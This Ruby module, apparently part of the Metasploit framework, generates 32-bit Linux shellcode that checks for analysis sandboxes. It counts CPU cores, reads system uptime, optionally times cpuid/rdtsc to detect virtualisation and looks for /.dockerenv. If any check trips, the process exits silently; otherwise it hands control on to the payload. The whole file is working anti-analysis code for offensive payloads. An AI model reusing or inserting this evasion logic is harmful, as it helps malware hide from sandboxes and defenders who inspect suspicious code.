module Msf::Payload::Linux::X86::SandboxEvasion
  def sandbox_evasion(cores = 2, uptime = 600, check_docker = true, check_virt = false)
    rdtsc_asm = ''
    if check_virt
      rdtsc_asm = %Q^
check_rdtsc:
    xor eax, eax
    cpuid
    rdtsc
    mov edi, eax
    mov esi, edx

    xor eax, eax
    cpuid
    rdtsc

    sub eax, edi
    sbb edx, esi
    test edx, edx
    jnz sandbox_detected

    xor ebx, ebx
    mov bx, 0x3e8
    cmp eax, ebx
    jae sandbox_detected
      ^
    end

    docker_asm = ''
    if check_docker
      docker_asm = %Q^
check_docker:
    xor eax, eax
    push eax
    push 0x766e6572        ; "renv"
    push 0x656b636f        ; "ocke"
    push 0x642e2f2f        ; "//.d"

    xor eax, eax
    mov al, 33             ; __NR_access
    mov ebx, esp           ; "//.dockerenv"
    xor ecx, ecx           ; F_OK
    int 0x80

    test eax, eax
    js clean_docker
    jmp sandbox_detected

clean_docker:
    add esp, 16
      ^
    end

    asm = %Q^
_start:
    push ebx
    push ebp
    push edi
    push esi

    xor eax, eax
    mov al, 128
    sub esp, eax

check_cores:
    xor eax, eax
    mov al, 242            ; __NR_sched_getaffinity
    xor ebx, ebx           ; pid = current process
    xor ecx, ecx
    mov cl, 128            ; affinity buffer size
    mov edx, esp
    int 0x80

    test eax, eax
    js check_uptime

    mov esi, esp
    lea edi, [esp + eax]   ; kernel returns bytes written
    xor ecx, ecx

count_core_bytes:
    cmp esi, edi
    jae evaluate_cores
    mov bl, [esi]
    inc esi

count_core_bits:
    test bl, bl
    jz count_core_bytes
    mov dl, bl
    dec dl
    and bl, dl
    inc ecx
    jmp count_core_bits

evaluate_cores:
    cmp ecx, #{cores}
    jl sandbox_detected

check_uptime:
    xor eax, eax
    mov al, 116            ; __NR_sysinfo
    mov ebx, esp
    int 0x80

    test eax, eax
    js execute_optional_checks

    mov eax, [esp]         ; sysinfo.uptime
    xor ebx, ebx
    mov bx, #{uptime}
    cmp eax, ebx
    jle sandbox_detected

execute_optional_checks:
#{rdtsc_asm}
#{docker_asm}

    jmp pass

sandbox_detected:
    xor eax, eax
    mov al, 252            ; __NR_exit_group
    xor ebx, ebx
    int 0x80

pass:
    xor eax, eax
    mov al, 128
    add esp, eax

    pop esi
    pop edi
    pop ebp
    pop ebx

    xor eax, eax
    xor ecx, ecx
    xor edx, edx
^
    Metasm::Shellcode.assemble(Metasm::Ia32.new, asm).encode_string
  end
end
